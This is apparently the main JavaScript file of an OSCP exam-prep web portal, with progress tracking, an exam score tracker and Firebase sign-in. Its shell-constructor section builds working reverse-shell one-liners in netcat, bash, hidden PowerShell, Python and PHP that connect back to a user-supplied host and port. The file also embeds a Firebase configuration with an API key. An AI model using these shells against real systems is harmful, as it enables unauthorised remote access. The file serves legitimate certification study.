/* ==========================================================================
   OSCP PREP PORTAL APPLICATION CONTROLLER (app.js)
   Controls navigation, generation of HTML from data, reverse shell calculation,
   local storage mechanisms, search filters, and progress calculations.
   ========================================================================== */

import { initializeApp } from "firebase/app";
import { getAuth, signInWithPopup, GoogleAuthProvider, signOut, onAuthStateChanged } from "firebase/auth";
import { getFirestore, doc, setDoc, getDoc } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyBjzH0TAsPe9wurm8A9chMnObvec7W-Zsc",
  authDomain: "oscp-9eb23.firebaseapp.com",
  projectId: "oscp-9eb23",
  storageBucket: "oscp-9eb23.firebasestorage.app",
  messagingSenderId: "660646456701",
  appId: "1:660646456701:web:624ed5494c8fb89c1cf014"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const googleProvider = new GoogleAuthProvider();

let currentUser = null;

document.addEventListener('DOMContentLoaded', () => {
  
  // Helper to safely load JSON
  function safeJSONParse(key, defaultValue) {
    try {
      const stored = localStorage.getItem(key);
      return stored ? JSON.parse(stored) : defaultValue;
    } catch (e) {
      console.warn(`Error parsing localStorage key "${key}". Resetting to default.`);
      return defaultValue;
    }
  }

  // State variables loaded from LocalStorage
  let currentTab = 'dashboard';
  let masteredSubtopics = safeJSONParse('oscp_mastered_subtopics', []);
  let completedPractice = safeJSONParse('oscp_completed_practice', []);
  
  // Default Target list for Exam Tracker
  const defaultTargets = [
    { name: 'AD-Set Client', type: 'Active Directory (Client)', points: 10, foothold: false, root: false, screenshot: false, verified: false },
    { name: 'AD-Set DC', type: 'Active Directory (Domain Controller)', points: 30, foothold: false, root: false, screenshot: false, verified: false },
    { name: 'Standalone Alpha', type: 'Standalone (20 pts)', points: 20, foothold: false, root: false, screenshot: false, verified: false },
    { name: 'Standalone Beta', type: 'Standalone (20 pts)', points: 20, foothold: false, root: false, screenshot: false, verified: false },
    { name: 'Standalone Gamma', type: 'Standalone (20 pts)', points: 20, foothold: false, root: false, screenshot: false, verified: false }
  ];
  let targetMachines = safeJSONParse('oscp_targets', defaultTargets);

  // DOM Elements cache
  const navButtons = document.querySelectorAll('.nav-btn');
  const sections = document.querySelectorAll('.view-section');
  const masteryPercentText = document.getElementById('mastery-percent');
  const masteryBarFill = document.getElementById('mastery-bar');
  
  // Dashboard stats
  const statTotalTopics = document.getElementById('stats-total-topics');

  const statCompletionBadge = document.getElementById('stats-completion-badge');
  
  // Views headings
  const viewTitle = document.getElementById('current-view-title');
  const viewSubtitle = document.getElementById('current-view-subtitle');

  // Title dictionary for views
  const viewHeadings = {
    dashboard: { title: 'Dashboard Overview', subtitle: 'Interactive tracker and statistics for your PEN-200 / OSCP prep.' },
    knowledge: { title: 'Syllabus Knowledge Portal', subtitle: 'Search and review all PEN-200 syllabus points, code blocks, and critical exam commands.' },
    timeline: { title: 'Exam Timeline & Checklist', subtitle: 'Step-by-step milestones to stay on schedule and prevent fatigue during the 24h exam.' },
    generator: { title: 'Active Reverse Shell Constructor', subtitle: 'Input your attacking environment parameters to generate custom payload shells.' },
    tracker: { title: 'Live Exam-Day Machine Tracker', subtitle: 'Log findings, track machine flags, and tally your total points dynamically.' },
    practice: { title: 'CTF Practice Machines Guide', subtitle: 'Curated list of vulnerable targets from PG, HTB, and VulnHub matching exam skillsets.' },
    resources: { title: 'Quick References & File Transfers', subtitle: 'Crucial cheat sheets, direct tools links, and network transfer commands.' }
  };

  /* ==========================================================================
     Tab Switch System
     ========================================================================== */
  navButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const tab = btn.getAttribute('data-tab');
      switchTab(tab);
    });
  });

  function switchTab(tabName) {
    currentTab = tabName;
    
    // Toggle active class on navigation buttons
    navButtons.forEach(btn => {
      if (btn.getAttribute('data-tab') === tabName) {
        btn.classList.add('active');
      } else {
        btn.classList.remove('active');
      }
    });

    // Toggle active class on view sections
    sections.forEach(sec => {
      if (sec.id === `view-${tabName}`) {
        sec.classList.add('active');
      } else {
        sec.classList.remove('active');
      }
    });

    // Update headings text
    if (viewHeadings[tabName]) {
      viewTitle.textContent = viewHeadings[tabName].title;
      viewSubtitle.textContent = viewHeadings[tabName].subtitle;
    }

    // Custom view actions upon loading
    if (tabName === 'knowledge') {
      renderKnowledgeGrid();
    } else if (tabName === 'timeline') {
      renderTimeline();
    } else if (tabName === 'tracker') {
      renderTrackerTable();
    } else if (tabName === 'practice') {
      renderPracticeTable();
    } else if (tabName === 'dashboard') {
      updateDashboardData();
    }
  }

  /* ==========================================================================
     Progress & Mastery Computations
     ========================================================================== */
  function calculateTotalSubtopics() {
    let total = 0;
    oscpData.topics.forEach(topic => {
      total += topic.subtopics.length;
    });
    return total;
  }

  function calculateMasteryPercentage() {
    const total = calculateTotalSubtopics();
    if (total === 0) return 0;
    return Math.round((masteredSubtopics.length / total) * 100);
  }

  function updateMasteryProgressBar() {
    const percent = calculateMasteryPercentage();
    masteryPercentText.textContent = `${percent}%`;
    masteryBarFill.style.width = `${percent}%`;
    
    // Change badge status depending on percentage
    if (percent === 100) {
      statCompletionBadge.textContent = 'ELITE CERTIFIED';
      statCompletionBadge.className = 'stat-value text-teal';
    } else if (percent >= 75) {
      statCompletionBadge.textContent = 'READY FOR EXAM';
      statCompletionBadge.className = 'stat-value text-blue';
    } else if (percent >= 40) {
      statCompletionBadge.textContent = 'COMPETENT';
      statCompletionBadge.className = 'stat-value text-purple';
    } else {
      statCompletionBadge.textContent = 'NOVICE';
      statCompletionBadge.className = 'stat-value text-red';
    }
  }

  function updateDashboardData() {
    const totalSubtopics = calculateTotalSubtopics();
    statTotalTopics.textContent = `${masteredSubtopics.length} / ${totalSubtopics}`;
    

    
    updateMasteryProgressBar();
  }

  /* ==========================================================================
     Knowledge Base Grid Renderer
     ========================================================================== */
  const knowledgeSearchInput = document.getElementById('knowledge-search');
  const categoryFiltersContainer = document.getElementById('category-filters');
  const knowledgeContainer = document.getElementById('knowledge-container');
  let selectedCategoryFilter = 'all';

  if (knowledgeSearchInput) {
    knowledgeSearchInput.addEventListener('input', () => {
      renderKnowledgeGrid();
    });
  }

  function renderCategoryFilters() {
    categoryFiltersContainer.innerHTML = '';
    
    // 'All' filter chip
    const allChip = document.createElement('div');
    allChip.className = `filter-chip ${selectedCategoryFilter === 'all' ? 'active' : ''}`;
    allChip.textContent = 'All Categories';
    allChip.addEventListener('click', () => {
      selectedCategoryFilter = 'all';
      renderCategoryFilters();
      renderKnowledgeGrid();
    });
    categoryFiltersContainer.appendChild(allChip);

    // Individual category chips
    oscpData.topics.forEach(topic => {
      const chip = document.createElement('div');
      chip.className = `filter-chip ${selectedCategoryFilter === topic.id ? 'active' : ''}`;
      chip.textContent = topic.title.split(' & ')[0].split(' ')[0]; // short representation
      chip.addEventListener('click', () => {
        selectedCategoryFilter = topic.id;
        renderCategoryFilters();
        renderKnowledgeGrid();
      });
      categoryFiltersContainer.appendChild(chip);
    });
  }

  function renderKnowledgeGrid() {
    if (!knowledgeContainer) return;
    
    const searchVal = knowledgeSearchInput ? knowledgeSearchInput.value.toLowerCase() : '';
    knowledgeContainer.innerHTML = '';

    oscpData.topics.forEach(topic => {
      // Category filter check
      if (selectedCategoryFilter !== 'all' && topic.id !== selectedCategoryFilter) return;

      // Filter subtopics based on search query
      const filteredSubtopics = topic.subtopics.filter(sub => {
        const titleMatch = sub.name.toLowerCase().includes(searchVal);
        const descMatch = sub.details.toLowerCase().includes(searchVal);
        const commandMatch = sub.commands.some(c => c.cmd.toLowerCase().includes(searchVal) || c.desc.toLowerCase().includes(searchVal));
        const tipsMatch = sub.tips.some(t => t.toLowerCase().includes(searchVal));
        return titleMatch || descMatch || commandMatch || tipsMatch;
      });

      if (filteredSubtopics.length === 0 && searchVal !== '') return;

      // Create topic container card wrapper
      const topicCard = document.createElement('div');
      topicCard.className = 'topic-wrapper glass-card';
      topicCard.id = `topic-${topic.id}`;
      
      // Calculate active subtopics mastered in this category
      const masteredInCategory = topic.subtopics.filter(sub => masteredSubtopics.includes(`${topic.id}_${sub.name}`)).length;

      topicCard.innerHTML = `
        <div class="topic-header" onclick="document.getElementById('topic-${topic.id}').classList.toggle('expanded')">
          <div class="topic-title-area">
            <h3>${topic.title}</h3>
            <p>${topic.description}</p>
          </div>
          <div class="topic-meta">
            <span class="mastery-tag">${masteredInCategory} / ${topic.subtopics.length} Mastered</span>
            <i class="fa-solid fa-chevron-down toggle-arrow"></i>
          </div>
        </div>
        <div class="topic-body"></div>
      `;

      const topicBody = topicCard.querySelector('.topic-body');

      // Populate subtopics inside body
      filteredSubtopics.forEach(sub => {
        const subtopicKey = `${topic.id}_${sub.name}`;
        const isMastered = masteredSubtopics.includes(subtopicKey);

        const subtopicDiv = document.createElement('div');
        subtopicDiv.className = 'subtopic-item';
        subtopicDiv.innerHTML = `
          <div class="subtopic-header">
            <h4>${sub.name}</h4>
            <button class="toggle-td-btn ${isMastered ? 'secured' : ''}" data-subtopic="${subtopicKey}">
              <i class="fa-solid ${isMastered ? 'fa-check' : 'fa-graduation-cap'}"></i> ${isMastered ? 'Mastered' : 'Mark Mastered'}
            </button>
          </div>
          <p class="subtopic-desc">${sub.details}</p>
          <div class="commands-container"></div>
          <div class="tips-container">
            <h5><i class="fa-solid fa-lightbulb"></i> Study Tips & Exam Tricks</h5>
            <ul class="tips-list"></ul>
          </div>
        `;

        // Add commands
        const cmdContainer = subtopicDiv.querySelector('.commands-container');
        sub.commands.forEach(cmd => {
          const cmdCard = document.createElement('div');
          cmdCard.className = 'command-line-card';
          cmdCard.innerHTML = `
            <div class="cmd-text-block">
              <span class="cmd-description">${cmd.desc}</span>
              <span class="cmd-code">${escapeHtml(cmd.cmd)}</span>
            </div>
            <button class="btn-icon-only copy-cmd-btn" aria-label="Copy command to clipboard" data-clipboard="${escapeHtml(cmd.cmd)}">
              <i class="fa-regular fa-copy"></i>
            </button>
          `;
          cmdContainer.appendChild(cmdCard);
        });

        // Add tips
        const tipsContainer = subtopicDiv.querySelector('.tips-list');
        sub.tips.forEach(tip => {
          const li = document.createElement('li');
          li.textContent = tip;
          tipsContainer.appendChild(li);
        });

        // Event listener for Mastered toggle button
        const masterBtn = subtopicDiv.querySelector('.toggle-td-btn');
        masterBtn.addEventListener('click', (e) => {
          e.stopPropagation();
          toggleSubtopicMastered(subtopicKey, masterBtn, topic.id);
        });

        topicBody.appendChild(subtopicDiv);
      });

      // Default expand if search is active
      if (searchVal !== '') {
        topicCard.classList.add('expanded');
      }

      knowledgeContainer.appendChild(topicCard);
    });

    // Handle Copy to clipboard listeners inside rendered grid
    const copyBtns = knowledgeContainer.querySelectorAll('.copy-cmd-btn');
    copyBtns.forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const cmd = btn.getAttribute('data-clipboard');
        copyTextToClipboard(cmd);
      });
    });
  }

  function toggleSubtopicMastered(subtopicKey, buttonElement, categoryId) {
    const index = masteredSubtopics.indexOf(subtopicKey);
    if (index > -1) {
      // Remove
      masteredSubtopics.splice(index, 1);
      buttonElement.classList.remove('secured');
      buttonElement.innerHTML = `<i class="fa-solid fa-graduation-cap"></i> Mark Mastered`;
    } else {
      // Add
      masteredSubtopics.push(subtopicKey);
      buttonElement.classList.add('secured');
      buttonElement.innerHTML = `<i class="fa-solid fa-check"></i> Mastered`;
    }
    
    localStorage.setItem('oscp_mastered_subtopics', JSON.stringify(masteredSubtopics));
    if (typeof saveUserData === 'function') saveUserData();
    
    updateDashboardData();
    updateMasteryProgressBar();

    // Re-render topic header count tag without completely rebuilding DOM node to keep animation stable
    const parentWrapper = document.getElementById(`topic-${categoryId}`);
    if (parentWrapper) {
      const topicObj = oscpData.topics.find(t => t.id === categoryId);
      const masteredInCategory = topicObj.subtopics.filter(sub => masteredSubtopics.includes(`${categoryId}_${sub.name}`)).length;
      const tag = parentWrapper.querySelector('.mastery-tag');
      if (tag) {
        tag.textContent = `${masteredInCategory} / ${topicObj.subtopics.length} Mastered`;
      }
    }
  }

  /* ==========================================================================
     Exam Timeline Guide Renderer
     ========================================================================== */
  const timelineFlow = document.getElementById('timeline-flow');

  function renderTimeline() {
    if (!timelineFlow) return;
    timelineFlow.innerHTML = '';

    oscpData.moments.forEach((mom, idx) => {
      const card = document.createElement('div');
      card.className = 'timeline-moment-card glass-card';
      
      card.innerHTML = `
        <div class="moment-header">
          <div class="moment-title-wrap">
            <h4>${mom.moment}</h4>
            <span class="moment-badge">${mom.timeframe}</span>
          </div>
        </div>
        <p class="moment-objective"><strong>Objective:</strong> ${mom.objective}</p>
        <ul class="moment-checklist"></ul>
      `;

      const list = card.querySelector('.moment-checklist');

      mom.checklist.forEach(item => {
        const li = document.createElement('li');
        li.innerHTML = `
          <div class="bullet-checklist-item">
            <i class="fa-solid fa-caret-right text-teal"></i>
            <span>${item}</span>
          </div>
        `;
        list.appendChild(li);
      });

      timelineFlow.appendChild(card);
    });
  }


  /* ==========================================================================
     Shell payload Constructor
     ========================================================================== */
  const lhostInput = document.getElementById('lhost');
  const lportInput = document.getElementById('lport');
  
  const ncCode = document.getElementById('nc-code');
  const bashCode = document.getElementById('bash-code');
  const powershellCode = document.getElementById('powershell-code');
  const pythonCode = document.getElementById('python-code');
  const phpCode = document.getElementById('php-code');

  if (lhostInput && lportInput) {
    lhostInput.addEventListener('input', updateReverseShells);
    lportInput.addEventListener('input', updateReverseShells);
  }

  function updateReverseShells() {
    const lhost = lhostInput.value || '10.10.14.5';
    const lport = lportInput.value || '4444';

    // 1. Netcat
    ncCode.textContent = `nc -e /bin/bash ${lhost} ${lport}`;

    // 2. Bash
    bashCode.textContent = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;

    // 3. PowerShell
    powershellCode.textContent = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;

    // 4. Python
    pythonCode.textContent = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;

    // 5. PHP
    phpCode.textContent = `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
  }

  // Handle Shell Card Copy triggers
  const shellCopyBtns = document.querySelectorAll('.copy-shell-btn');
  shellCopyBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const codeId = btn.getAttribute('data-target');
      const codeBlock = document.getElementById(codeId);
      if (codeBlock) {
        copyTextToClipboard(codeBlock.textContent);
      }
    });
  });

  /* ==========================================================================
     Exam Day Live target Tracker
     ========================================================================== */
  const trackerTbody = document.getElementById('tracker-tbody');
  const addTargetBtn = document.getElementById('add-target-btn');
  const liveScoreText = document.getElementById('live-score');
  const liveScoreBar = document.getElementById('live-score-bar');
  const liveScoreStatus = document.getElementById('live-score-status');

  if (addTargetBtn) {
    addTargetBtn.addEventListener('click', () => {
      const name = prompt("Enter Target machine alias (e.g. Standalone Delta):");
      if (!name) return;
      const type = prompt("Enter Machine Points Weight (e.g., 20):", "20");
      if (!type) return;

      const pts = parseInt(type) || 20;
      targetMachines.push({
        name: name,
        type: `Custom Target (${pts} pts)`,
        points: pts,
        foothold: false,
        root: false,
        screenshot: false,
        verified: false
      });

      saveTargets();
      renderTrackerTable();
    });
  }

  function saveTargets() {
    localStorage.setItem('oscp_targets', JSON.stringify(targetMachines));
    if (typeof saveUserData === 'function') saveUserData();
  }

  function renderTrackerTable() {
    if (!trackerTbody) return;
    trackerTbody.innerHTML = '';

    targetMachines.forEach((machine, idx) => {
      const tr = document.createElement('tr');
      
      tr.innerHTML = `
        <td>${machine.name}</td>
        <td>${machine.type}</td>
        <td>
          <button class="toggle-td-btn ${machine.foothold ? 'secured' : ''}" data-idx="${idx}" data-field="foothold">
            <i class="fa-solid ${machine.foothold ? 'fa-lock-open' : 'fa-lock'}"></i> ${machine.foothold ? 'Secured' : 'Foothold'}
          </button>
        </td>
        <td>
          <button class="toggle-td-btn ${machine.root ? 'secured' : ''}" data-idx="${idx}" data-field="root">
            <i class="fa-solid ${machine.root ? 'fa-shield-halved' : 'fa-shield'}"></i> ${machine.root ? 'SYSTEM' : 'Root'}
          </button>
        </td>
        <td>
          <button class="toggle-td-btn ${machine.screenshot ? 'secured' : ''}" data-idx="${idx}" data-field="screenshot">
            <i class="fa-solid ${machine.screenshot ? 'fa-image' : 'fa-camera'}"></i> ${machine.screenshot ? 'Saved' : 'Screenshot'}
          </button>
        </td>
        <td>
          <button class="toggle-td-btn ${machine.verified ? 'secured' : ''}" data-idx="${idx}" data-field="verified">
            <i class="fa-solid ${machine.verified ? 'fa-circle-check' : 'fa-circle'}"></i> ${machine.verified ? 'Verified' : 'Verify'}
          </button>
        </td>
        <td>
          <button class="btn-icon-only text-red delete-target-btn" aria-label="Delete Target Machine" data-idx="${idx}">
            <i class="fa-solid fa-trash-can"></i>
          </button>
        </td>
      `;

      // Wire target toggle triggers
      tr.querySelectorAll('.toggle-td-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
          const field = btn.getAttribute('data-field');
          machine[field] = !machine[field];
          
          saveTargets();
          renderTrackerTable();
        });
      });

      // Wire target delete trigger
      tr.querySelector('.delete-target-btn').addEventListener('click', () => {
        if (confirm(`Remove machine "${machine.name}" from target list?`)) {
          targetMachines.splice(idx, 1);
          saveTargets();
          renderTrackerTable();
        }
      });

      trackerTbody.appendChild(tr);
    });

    calculateLiveExamScore();
  }

  function calculateLiveExamScore() {
    let score = 0;

    targetMachines.forEach(machine => {
      // Active Directory is all-or-nothing (40 pts total)
      // Standard standalones are split: 50% for user (foothold), 50% for system (root)
      const points = machine.points;
      
      if (machine.type.includes('Active Directory')) {
        // If it's AD, you only get points if root is compromised on DC (whole AD compromised)
        // However, for granularity during study/exam track:
        // We'll give AD Foothold 10 pts (Client System) and AD DC Root 30 pts (DC System)
        if (machine.name.includes('Client') && machine.root) {
          score += 10;
        } else if (machine.name.includes('DC') && machine.root) {
          score += 30;
        }
      } else {
        // Standalone
        if (machine.foothold) score += points / 2;
        if (machine.root) score += points / 2;
      }
    });

    // Update displays
    liveScoreText.textContent = score;
    const progressPercent = Math.min((score / 70) * 100, 100);
    liveScoreBar.style.width = `${progressPercent}%`;

    if (score >= 70) {
      liveScoreStatus.textContent = "PASS SECURED! Ensure documentation is full.";
      liveScoreStatus.className = "score-status text-center passed";
      liveScoreBar.style.background = "linear-gradient(90deg, var(--neon-teal), #22c55e)";
    } else {
      liveScoreStatus.textContent = `${70 - score} Points Remaining to Pass`;
      liveScoreStatus.className = "score-status text-center";
      liveScoreBar.style.background = "linear-gradient(90deg, var(--neon-blue), var(--neon-purple))";
    }
  }

  /* ==========================================================================
     Toast notifications & Clipboard Systems
     ========================================================================== */
  const toast = document.getElementById('toast');

  function copyTextToClipboard(text) {
    if (!navigator.clipboard) {
      // Fallback
      const textArea = document.createElement("textarea");
      textArea.value = text;
      textArea.style.top = "0";
      textArea.style.left = "0";
      textArea.style.position = "fixed";
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();
      try {
        document.execCommand('copy');
        showToast("Copied command to clipboard!");
      } catch (err) {
        showToast("Error copying text");
      }
      document.body.removeChild(textArea);
      return;
    }
    
    navigator.clipboard.writeText(text).then(() => {
      showToast("Copied command to clipboard!");
    }, () => {
      showToast("Error copying text");
    });
  }

  function showToast(message) {
    if (!toast) return;
    toast.textContent = message;
    toast.classList.add('show');
    setTimeout(() => {
      toast.classList.remove('show');
    }, 2500);
  }

  /* ==========================================================================
     Settings Modal & Global Reset
     ========================================================================== */
  const settingsBtn = document.getElementById('settings-open-btn');
  const settingsModal = document.getElementById('settings-modal');
  const settingsCloseBtn = document.getElementById('settings-close-btn');

  if (settingsBtn && settingsModal) {
    settingsBtn.addEventListener('click', () => {
      settingsModal.classList.add('show');
    });

    settingsCloseBtn.addEventListener('click', () => {
      settingsModal.classList.remove('show');
    });

    // Close when clicking outside the modal content
    settingsModal.addEventListener('click', (e) => {
      if (e.target === settingsModal) {
        settingsModal.classList.remove('show');
      }
    });
  }

  const resetBtn = document.getElementById('reset-data');
  if (resetBtn) {
    resetBtn.addEventListener('click', () => {
      if (confirm('Are you sure you want to reset ALL your progress? This cannot be undone.')) {
        localStorage.removeItem('oscp_mastered_subtopics');
        localStorage.removeItem('oscp_targets');
        localStorage.removeItem('oscp_completed_practice');
        masteredSubtopics = [];
        targetMachines = JSON.parse(JSON.stringify(defaultTargets));
        completedPractice = [];
        if (typeof saveUserData === 'function') saveUserData();
        
        saveTargets();
        switchTab('dashboard');
        updateDashboardData();
        showToast("All progress has been reset.");
        
        if (settingsModal) {
          settingsModal.classList.remove('show');
        }
      }
    });
  }

  /* ==========================================================================
     Helper Utilities
     ========================================================================== */
  function escapeHtml(text) {
    return text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  }

  /* ==========================================================================
     CTF Prep Practice Table Renderer
     ========================================================================== */
  const practiceTbody = document.getElementById('practice-tbody');
  const practiceCountSummary = document.getElementById('practice-count-summary');
  
  let filterPlatform = 'all';
  let filterOs = 'all';
  let filterDifficulty = 'all';

  function renderPracticeTable() {
    if (!practiceTbody) return;
    practiceTbody.innerHTML = '';

    const filtered = oscpData.vulnerableMachines.filter(m => {
      const matchPlatform = filterPlatform === 'all' || m.platform === filterPlatform;
      const matchOs = filterOs === 'all' || m.os === filterOs;
      const matchDiff = filterDifficulty === 'all' || m.difficulty === filterDifficulty;
      return matchPlatform && matchOs && matchDiff;
    });

    let completedCount = 0;

    filtered.forEach(machine => {
      const isDone = completedPractice.includes(machine.name);
      if (isDone) completedCount++;

      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td style="text-align: left; font-weight: 600;">${machine.name}</td>
        <td>${machine.platform}</td>
        <td>${machine.os === 'Linux' ? '<i class="fa-brands fa-linux text-teal"></i> Linux' : '<i class="fa-brands fa-windows text-blue"></i> Windows'}</td>
        <td><span class="moment-badge" style="background: rgba(0, 0, 0, 0.03); color: var(--text-secondary); border: 1px solid var(--panel-border); font-size: 0.75rem;">${machine.difficulty}</span></td>
        <td style="text-align: left;">${machine.focus}</td>
        <td>
          <button class="toggle-td-btn ${isDone ? 'secured' : ''}" data-machine="${machine.name}">
            <i class="fa-solid ${isDone ? 'fa-circle-check' : 'fa-circle'}"></i> ${isDone ? 'Done' : 'Practice'}
          </button>
        </td>
      `;

      const btn = tr.querySelector('.toggle-td-btn');
      btn.addEventListener('click', () => {
        togglePracticeMachine(machine.name);
      });

      practiceTbody.appendChild(tr);
    });

    if (practiceCountSummary) {
      practiceCountSummary.textContent = `Showing ${filtered.length} / ${oscpData.vulnerableMachines.length} Machines (${completedCount} completed)`;
    }
  }

  function togglePracticeMachine(machineName) {
    const idx = completedPractice.indexOf(machineName);
    if (idx > -1) {
      completedPractice.splice(idx, 1);
    } else {
      completedPractice.push(machineName);
    }
    localStorage.setItem('oscp_completed_practice', JSON.stringify(completedPractice));
    if (typeof saveUserData === 'function') saveUserData();
    
    updateDashboardData();
    renderPracticeTable();
  }

  // Setup practice filter listeners
  document.querySelectorAll('[data-filter-platform]').forEach(chip => {
    chip.addEventListener('click', () => {
      document.querySelectorAll('[data-filter-platform]').forEach(c => c.classList.remove('active'));
      chip.classList.add('active');
      filterPlatform = chip.getAttribute('data-filter-platform');
      renderPracticeTable();
    });
  });

  document.querySelectorAll('[data-filter-os]').forEach(chip => {
    chip.addEventListener('click', () => {
      document.querySelectorAll('[data-filter-os]').forEach(c => c.classList.remove('active'));
      chip.classList.add('active');
      filterOs = chip.getAttribute('data-filter-os');
      renderPracticeTable();
    });
  });

  document.querySelectorAll('[data-filter-difficulty]').forEach(chip => {
    chip.addEventListener('click', () => {
      document.querySelectorAll('[data-filter-difficulty]').forEach(c => c.classList.remove('active'));
      chip.classList.add('active');
      filterDifficulty = chip.getAttribute('data-filter-difficulty');
      renderPracticeTable();
    });
  });

  // Auth Logic
  const authBtn = document.getElementById('auth-btn');
  const authBtnText = document.getElementById('auth-btn-text');

  if (authBtn) {
    authBtn.addEventListener('click', () => {
      if (currentUser) {
        signOut(auth);
      } else {
        signInWithPopup(auth, googleProvider);
      }
    });
  }

  async function loadUserData() {
    if (!currentUser) return;
    try {
      const docRef = doc(db, "users", currentUser.uid);
      const docSnap = await getDoc(docRef);
      if (docSnap.exists()) {
        const data = docSnap.data();
        masteredSubtopics = data.masteredSubtopics || [];
        completedPractice = data.completedPractice || [];
        targetMachines = data.targetMachines || defaultTargets;
      }
    } catch (e) {
      console.error("Error loading user data:", e);
    }
    renderCategoryFilters();
    if (currentTab === 'knowledge') renderKnowledgeGrid();
    if (currentTab === 'tracker') renderTrackerTable();
    if (currentTab === 'practice') renderPracticeTable();
    updateDashboardData();
  }

  async function saveUserData() {
    if (!currentUser) return;
    try {
      await setDoc(doc(db, "users", currentUser.uid), {
        masteredSubtopics,
        completedPractice,
        targetMachines
      });
    } catch (e) {
      console.error("Error saving user data:", e);
    }
  }

  window.saveUserData = saveUserData;

  onAuthStateChanged(auth, (user) => {
    if (user) {
      currentUser = user;
      if (authBtnText) authBtnText.textContent = "Sign Out";
      loadUserData();
    } else {
      currentUser = null;
      if (authBtnText) authBtnText.textContent = "Sign In";
    }
  });

  // Initialize
  renderCategoryFilters();
  updateDashboardData();
  updateReverseShells();
});
